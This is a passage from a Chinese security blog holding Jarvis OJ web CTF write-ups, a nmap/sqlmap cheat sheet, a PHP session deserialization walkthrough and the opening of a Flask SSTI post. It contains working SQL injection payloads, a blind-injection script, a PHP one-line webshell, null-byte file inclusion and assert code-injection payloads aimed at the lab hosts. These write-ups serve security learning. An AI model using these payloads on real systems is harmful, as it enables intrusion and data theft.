<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203912.png"></p>
<p>注意到cookie中的admin字段，将其改为1：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106203947.png"></p>
<p>得到flag</p>
<h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106204452-1024x350.png"></p>
<p>需要用本地的51端口访问，使用curl工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --local-port 51 http:&#x2F;&#x2F;web.jarvisoj.com:32770&#x2F;</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191106204610.png"></p>
<h2 id="In-a-mess"><a href="#In-a-mess" class="headerlink" title="In a mess"></a>In a mess</h2><p>进入链接：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110102608.png"></p>
<p>进入index.phps，可造成源码泄露：</p>
<?php

error\_reporting(0);
echo "<!--index.phps-->";

if(!$\_GET\['id'\])
{
header('Location: index.php?id=1');
exit();
}
$id=$\_GET\['id'\];
$a=$\_GET\['a'\];
$b=$\_GET\['b'\];
if(stripos($a,'.'))
{
echo 'Hahahahahaha';
return ;
}
$data = @file\_get\_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
require("flag.txt");
}
else
{
print "work harder!harder!harder!";
}


?>

<p>阅读源码，可知参数$a中不能出现.字符，并且需要以$a为文件名的文件内容是所给定的字符串，想到php://input伪协议。参数$b需要其与字符串”111”拼接后的内容与1114相等，却又需要第一个字符不为4，且长度大于5.注意到这里采用了eregi函数，想到eregi的NULL截断漏洞，故可构造payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;index.php?id&#x3D;%22%22&amp;a&#x3D;php:&#x2F;&#x2F;input&amp;b&#x3D;%00123456789</span><br></pre></td></tr></table></figure>

<p>同时post数据：1112 is a nice lab!，即可得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110103320-1024x466.png"></p>
<p>此为下一个部分的地址，进入得到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110103500.png"></p>
<p>观察url:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;%5eHT2mCpcvOLf&#x2F;index.php?id&#x3D;1</span><br></pre></td></tr></table></figure>

<p>注意到id参数，尝试sql注入：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110103651-1024x648.png"></p>
<p>证实猜测。现在测试过滤哪些字符，经测试，有如下关键词：</p>
<ul>
<li>  space(空格)</li>
<li>  tab</li>
<li>  /**/</li>
<li>  select</li>
<li>  union</li>
<li>  from</li>
</ul>
<p>注意到过滤词很多，但是对于后三个只是采用简单的正则替换，而对于/**/，可以采用如/*1*/的方式绕过，达到空格的效果，故注入的过程如下：</p>
<p>首先使用order by注出列数为3，然后注出数据库名：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104306-1024x642.png"></p>
<p>表名：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104316-1024x394.png"></p>
<p>字段名：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104324-1024x376.png"></p>
<p>字段内容：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191110104333-1024x385.png"></p>
<p>得到flag。</p>
<h2 id="RE？"><a href="#RE？" class="headerlink" title="RE？"></a>RE？</h2><p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191125002504-1024x243.png"></p>
<p>这里首先给出了一个文件下载，观察文件名猜测是mysql中的用户定义函数，观察后缀so猜测为linux下的动态链接库文件(如为windows则为.dll)。下载改名为udf.so,导入mysql的plugin文件夹，启动mysql。题目中有提示help_me函数，故执行语句：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191125002804.png"></p>
<p>于是继续导入getflag函数：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191125002839.png"></p>
<p>得到flag。mysql中的udf的详细资料可参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/10522972.html">https://www.cnblogs.com/sijidou/p/10522972.html</a></p>
<h2 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h2><p>页面很简单，考察点也很明确，即sql注入：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191127194439-1024x543.png"></p>
<p>经过一些测试发现在某些情况下回显为用户名错误，某些情况下回显为密码错误，即进行用户名查询时若查询成功但密码不正确返回密码错误，我们可以利用这一点判断条件是否满足，以此进行盲注。</p>
<p>经过进一步测试，发现这里过滤了空格，即将空格替换为空。使用payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39;# password&#x3D;123</span><br><span class="line">username:admin&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1 password&#x3D;123</span><br></pre></td></tr></table></figure>

<p>回显均为密码错误，可猜测对用户名的查询是拼接上单引号后直接进行查询。故可编写脚本对其进行爆破。首先判断回显值的意义：</p>
<p>def check_result(r):<br>    if re.search(“用户名错误”, r.text):<br>        return “no pass”<br>    elif re.search(“密码错误”, r.text):<br>        return “pass”<br>    else:<br>        return “nothing”</p>
<p>其次，使用二分搜索的方法对字段进行爆破：</p>
<p>def burp(url, sql_query, info):<br>    is_end = False<br>    count = 1<br>    while not is_end:<br>        inf = 36<br>        sup = 127<br>        is_end = True<br>        while sup &gt; inf:<br>            i = (inf + sup) // 2<br>            data = {<br>                ‘username’: “admin’/**/and/**/ascii(substring(({}),{},1))={}#”.format(sql_query, count, i),<br>                ‘password’: “123”}<br>            result = check_result(requests.post(url, data))<br>            if result is “pass”:<br>                is_end = False<br>                break<br>            else:<br>                data[‘username’] = data[‘username’].replace(“1))=”, “1))&gt;”)<br>                result = check_result(requests.post(url, data))<br>                if result is “pass”:<br>                    inf = i + 1<br>                else:<br>                    sup = i<br>        if not is_end:<br>            count += 1<br>            info.append(chr(i))</p>
<p>最后编写爆出库名，表名，字段名，字段内容的各个查询语句：</p>
<p>def get_database(url):<br>    sql_query = “database()”<br>    database = []<br>    burp(url, sql_query, database)<br>    print(“”.join(database))</p>
<p>def get_table(url):<br>    sql_query = “select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/“ \<br>                “table_schema=database()”<br>    table_name = []<br>    burp(url, sql_query, table_name)<br>    print(“”.join(table_name))</p>
<p>def get_column(url):<br>    sql_query = “select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/“ \<br>                “table_name=’admin’”<br>    column_name = []<br>    burp(url, sql_query, column_name)<br>    print(“”.join(column_name))</p>
<p>def get_data(url):<br>    sql_query = “select/**/group_concat(id,username,password)/**/from/**/admin”<br>    data = []<br>    burp(url, sql_query, data)<br>    print(“”.join(data))</p>
<p>调用之后可得到信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># number of columns:1</span><br><span class="line"># database:injection</span><br><span class="line"># table:admin</span><br><span class="line"># column:id,username,password</span><br><span class="line"># data:1,admin,334cfb59c9d74849801d5acdcfdaadc3</span><br></pre></td></tr></table></figure>

<p>这里的密码采用md5处理后保存，查询后得到密码，登录得到flag：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191127195845.png"></p>
<h2 id="Simple-gallery"><a href="#Simple-gallery" class="headerlink" title="Simple gallery"></a>Simple gallery</h2><p>进入链接，发现功能点较多，如下图，猜测主要可利用点为文件上传。</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/01/image-1024x373.png"></p>
<p>该处的url为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32785&#x2F;index.php?page&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>观察page参数，猜测后端通过page参数读取本地文件，可能能进行本地文件包含。尝试如下url：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32785&#x2F;index.php?page&#x3D;submit.php</span><br></pre></td></tr></table></figure>

<p>回显为：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/01/image-1-1024x142.png"></p>
<p>证实这里的后端代码是通过page参数拼接后缀扩展名进行文件包含。进一步尝试发现%00截断可用，即使用payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32785&#x2F;index.php?page&#x3D;submit.php%00</span><br></pre></td></tr></table></figure>

<p>结果正确。</p>
<p>解决文件包含问题后，目标转为上传shell。尝试上传文件，发现后端对文件扩展名，MIME，文件标识字段都进行了检查。于是尝试上传图片马，编写一句话木马1.php与正常图片采用如下命令进行拼接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy pic.jpg&#x2F;b + 1.php&#x2F;a 1.jpg</span><br></pre></td></tr></table></figure>

<p>即生成图片马，上传至服务器，得到上传后的文件名。使用如下payload进行访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32785&#x2F;index.php?page&#x3D;uploads&#x2F;1579144207.jpg%00</span><br></pre></td></tr></table></figure>

<p><img src="http://106.54.80.67/wp-content/uploads/2020/01/image-2.png"></p>
<p>发现被拦截，可能为检测到马中的关键字符。于是换用如下语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;cmd&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>生成图片马后上传后直接得到flag：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/01/image-3.png"></p>
<h2 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h2><p>站点内仅有图片上传功能</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image.png"></p>
<p>经过测试，其通过白名单检测后缀与类型，找不到绕过方法。扫描后台发现test.php，作用为phpinfo。阅读别人文章后发现，通过phpinfo可以得知该站点使用了imagick服务：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-1-1024x364.png"></p>
<p>这里可以利用CVE-2016-3714，具体内容参考<a target="_blank" rel="noopener" href="https://www.jb51.net/article/94419.htm">https://www.jb51.net/article/94419.htm</a>。这里我们利用eliftool工具写入希望执行的代码，即：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-2.png"></p>
<p>上传文件时需要将filetype参数改为show或win，原因在CVE的原理中提到过，是为了调用所需要的委托。在测试中发现，修改filetype后图片无法上传，可能为环境已经被破坏。正常在上传之后就能使用菜刀连接shell读取文件。</p>
<h2 id="Inject"><a href="#Inject" class="headerlink" title="Inject"></a>Inject</h2><p>题目提示先获取源码，尝试.git，svn等方式后发现php~课获得源码如下：</p>
<?php
require("config.php");
$table = $\_GET\['table'\]?$\_GET\['table'\]:"test";
$table = Filter($table);
mysqli\_query($mysqli,"desc \`secret\_{$table}\`") or Hacker();
$sql = "select 'flag{xxx}' from secret\_{$table}";
$ret = sql\_query($sql);
echo $ret\[0\];
?>

<p>分析代码逻辑，发现代码首先获取table参数的值，若table值不存在则设为test。其次通过过滤器。而后执行查询语句<code>decs `secret_&#123;$table&#125;` </code> ，而我们发现，如果该语句运行失败，即参数不是事实存在的库，则会触发Hacker()函数。而事实上执行注入的语句应为后面的<code>select &#39;flag&#123;xxx&#125;&#39; from secret_&#123;$table&#125;</code>,并且该查询语句有回显。对于第一条语句，其中使用了反引号，根据实验和阅读文章，得知在mysql中反引号的作用主要有两点，其一是用于包裹mysql中的关键字，使之解释为普通的字符串而非关键字，其二则可用于为库设置别名，如下所示：</p>
<p>select `select` from a # 从a表中查询select字段<br>select  bbb `aaa` from a # 从a表中查询bbb字段，并赋予bbb字段aaa别名</p>
<p>则可构造参数闭合反引号，即查询payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?&#x2F;table&#x3D;test&#96; &#96; union select database() limit 1,1</span><br><span class="line">?&#x2F;table&#x3D;test&#96; &#96; union select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1</span><br><span class="line">&#x2F;?table&#x3D;test&#96; &#96; union select column_name from information_schema.columns where table_name&#x3D;0x7365637265745F666C6167 limit 1,1</span><br></pre></td></tr></table></figure>

<p>分别得到库名，表名和字段名，注意到代码中过滤了引号，所以采用16进制输入。</p>
<h2 id="Web？"><a href="#Web？" class="headerlink" title="Web？"></a>Web？</h2><p>这题比较繁琐。进入页面，仅有一个提交密码的界面。抓包没有收获，查看源代码中引入的app.js，格式化后为20000多行的js代码。搜索返回的错误代码，发现如下函数：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-3.png"></p>
<p>跳转到checkpass函数：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-4.png"></p>
<p>再次查找_checkpass_REACT_HOT_LOADER，发现：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-5-1024x625.png"></p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-6-1024x313.png"></p>
<p>是一个求矩阵乘法的问题，使用在线网站解出即可。</p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>首页中给出提示</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2020/04/image-7.png"></p>
<p>可能为git源码泄露，使用githack获取源码，对源码进行分析，在index.php中有对page参数的处理：</p>
<?php
if (isset($\_GET\['page'\])) {
$page = $\_GET\['page'\];
} else {
$page = "home";
}
$file = "templates/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("file\_exists('$file')") or die("That file doesn't exist!");
?>

<p>这里的考察点是断言的代码注入。执行assert函数时，若参数为字符串，则php解析引擎将字符串作为代码执行。所以对于语句<code>assert(&quot;file_exists(&#39;$file&#39;)&quot;)</code> 可将函数闭合后进行代码注入，即payload为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;&#39;.system(cat flag.php).&#39;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/06/jarvis-oj-writeup-web/" data-id="ckpw1c6v3001xfww0hib36jb0" data-title="Jarvis OJ WriteUp Web" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-渗透常用工具整理" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/06/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/" class="article-date">
  <time class="dt-published" datetime="2019-11-06T10:45:13.000Z" itemprop="datePublished">2019-11-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Notes/">Notes</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/06/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/">渗透常用工具整理</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>本文整理了一些常用的渗透测试工具的用法，将会持续更新。</p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h3 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h3><p>nmap是一种端口扫描工具，通过扫描目的主机，可以得到目的主机上端口开放状态以及端口上运行的协议类型等信息，常用于渗透测试前期对目的主机进行信息搜集。</p>
<h3 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v target_ip </span><br></pre></td></tr></table></figure>

<p>-v:冗余模式，给出端口详细信息</p>
<p>-A:全面进攻性扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -v target_ip</span><br></pre></td></tr></table></figure>

<p>-F：快速扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -v target_ip</span><br></pre></td></tr></table></figure>

<p>-O：操作系统扫描</p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><h3 id="用处-1"><a href="#用处-1" class="headerlink" title="用处"></a>用处</h3><p>sqlmap是一种自动化的sql注入漏洞扫描工具，支持显错注入，布尔盲注，延时注入，堆注入和联合查询注入物种查询方式</p>
<h3 id="常用语法-1"><a href="#常用语法-1" class="headerlink" title="常用语法"></a>常用语法</h3><p>sqlmap的相关参数很多，这里只列出几个常用的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;target_url&quot;</span><br></pre></td></tr></table></figure>

<p>扫描目标url中可能注入的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;target_url&quot; --dbs</span><br></pre></td></tr></table></figure>

<p>注出数据库名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;target_url&quot; -D database_name --tables</span><br></pre></td></tr></table></figure>

<p>注出给定库中表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;target_url&quot; -D database_name -T table_name --columns</span><br></pre></td></tr></table></figure>

<p>注出给定表中列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;target_url&quot; -D database_name -T table_name -C column_name --dump</span><br></pre></td></tr></table></figure>

<p>注出该字段</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/06/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/" data-id="ckpw1c6uq000zfww0e98lf9rh" data-title="渗透常用工具整理" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-php中session的反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/03/php%E4%B8%ADsession%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2019-11-03T13:52:19.000Z" itemprop="datePublished">2019-11-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Notes/">Notes</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/03/php%E4%B8%ADsession%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP中session的反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>在php中，可以将session中的字段自动进行反序列化，生成相应的数组或者对象。但是有时，因为反序列化与序列化时所采用的引擎不同，可能导致反序列化漏洞，下面具体介绍session的反序列化机制和相关的ctf题目。</p>
<h2 id="session的序列化与反序列化"><a href="#session的序列化与反序列化" class="headerlink" title="session的序列化与反序列化"></a>session的序列化与反序列化</h2><h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><p>php中的session以文件形式存放在服务器端，其文件名为sess+下划线+sessionid，如下图所示：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191103210123.png"></p>
<p>打开文件夹，内部便为session的值。session的保存方式由配置文件中的 session.save_handler 决定，保存路径则由 session.save_path 决定。</p>
<h3 id="引擎"><a href="#引擎" class="headerlink" title="引擎"></a>引擎</h3><p>php对数组或对象的序列化有三种格式，在ini中使用php_serialize_handler变量作为标识，分别为php，php_serialize与php_binary，使用如下的demo：</p>
<?php
session\_start();
$\_SESSION\['name'\] = 'abcd';
?>

<p>打开生成的session文件，可以得到不同引擎解析得到的效果如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler&#x3D;php :names:4:&quot;abcd&quot;;</span><br><span class="line">session.serialize_handler&#x3D;php_serialize: a:1:&#123;s:4:&quot;name&quot;;s:4:&quot;abcd&quot;;&#125;</span><br><span class="line">session.serialize_handler&#x3D;php_binary: &#x2F;*ASCLL&#x3D;4*&#x2F;names:4:&quot;abcd&quot;;</span><br></pre></td></tr></table></figure>

<p>观察这三种格式，分析得到，php解析引擎以竖线分隔键与值，php_serialize则将键值对整体包含进数组，a:1为这种解析方式所独有的，php_binary形式则是以二进制ASCII码存储。下面我们重点关注php和php_serialize两种解析方式。</p>
<h3 id="解析错误"><a href="#解析错误" class="headerlink" title="解析错误"></a>解析错误</h3><p>在php中，默认采用的是php_serialize解析引擎，但是如果在某段php程序中，使用php_serialize解析引擎作为序列化的引擎，在客户端发送请求回到服务器时，对session解码却采用的是默认的php解析引擎，在攻击者构造好的payload的攻击下，就有可能导致反序列化漏洞。</p>
<p>下面使用Jarvis OJ上的一道CTF题的解题过程来进一步验证。</p>
<h2 id="Jarvis-OJ-PHPINFO"><a href="#Jarvis-OJ-PHPINFO" class="headerlink" title="Jarvis OJ PHPINFO"></a>Jarvis OJ PHPINFO</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目地址如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;</span><br></pre></td></tr></table></figure>

<p>进入可获得源码：</p>
<?php
//A webshell is wait for you
ini\_set('session.serialize\_handler', 'php');
session\_start();
class OowoO
{
    public $mdzz;
    function \_\_construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function \_\_destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($\_GET\['phpinfo'\]))
{
    $m = new OowoO();
}
else
{
    highlight\_string(file\_get\_contents('index.php'));
}
?>

<p>使用payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;?phpinfo&#x3D;123</span><br></pre></td></tr></table></figure>

<p>可得到phpinfo界面。因代码中设置session序列化方式为php，所以我们重点观察与session有关的配置，注意到：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191103212015.png"></p>
<p>local value与master value的值在这里不相同，即可以通过引擎解析方式的不同利用反序列化漏洞构造可控变量，并使用析构函数中的eval达到写入shell的目的。现在问题转化为如何控制session的值。我们将目光放到session.upload_progress上来。</p>
<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><p>session.upload_progress的作用是监控大文件的上传进度，其能否使用由配置文件中的session.upload_progress.enabled决定。</p>
<p>当上传某个文件时，如果post与配置文件中 session.upload_progress.name (默认值为PHP_SESSION_UPLOAD_PROGRESS)值同名的变量，php就会在session中添加一组键值对，键为session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值 ，值中包含许多上传文件的信息，如文件名，文件大小，开始时间等信息。因此，我们可以通过修改文件名达到控制session部分值的目的。</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>首先我们构造一个向目标url发送网址的页面：</p>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
    <form action="http://web.jarvisoj.com:32784/" method="post" enctype="multipart/form-data">
        <input type="hidden" name="PHP\_SESSION\_UPLOAD\_PROGRESS" value="123">
        <input type="file" name="file">
        <input type="submit">
</body>
</html>

<p>随意选择文件后发送请求，使用burp抓包：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191103213821.png"></p>
<p>现在需要对其中的filename进行修改，达到控制session的目的，于是我们编写php程序构造所需的序列：</p>
<?php
ini\_set('session.serialize\_handler', 'php');
session\_start();
class OowoO{
    public $mdzz;
    function \_\_construct(){
        $this->mdzz = 'phpinfo();';
    }

    function \_\_destruct(){
        #eval($this->mdzz);
    }
}
$\_SESSION\['payload'\] = new OowoO();
?>

<p>打开session文件，得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadO:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>修改filename的值注意进行<strong>转义</strong>：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191103214401.png"></p>
<p>可知注入成功。下面注出所在目录下的所有文件：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191103214630.png"></p>
<p>下面读取flag所在文件的内容：</p>
<p><img src="http://106.54.80.67/wp-content/uploads/2019/11/QQ%E6%88%AA%E5%9B%BE20191103214854.png"></p>
<p>得到flag。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>php的session反序列化是ctf中的常见考点，今年的peekgeek中也有考察。防御该漏洞的重点在于php反序列化引擎的合理运用，避免序列化与反序列化采用不同的引擎。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/03/php%E4%B8%ADsession%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="ckpw1c6ug000lfww086025055" data-title="PHP中session的反序列化" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-cnss-true-love-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/16/cnss-true-love-writeup/" class="article-date">
  <time class="dt-published" datetime="2019-10-16T12:57:56.000Z" itemprop="datePublished">2019-10-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WriteUp-in-platform/">WriteUp in platform</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/16/cnss-true-love-writeup/">CNSS True_Love WriteUp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>这道题主要的点在于Python的轻量级模板Flask的服务器模板注入和客户端session两个问题。本文的重点不在于具体的题目，而在于ssti和客户端session机制两个问题。</p>
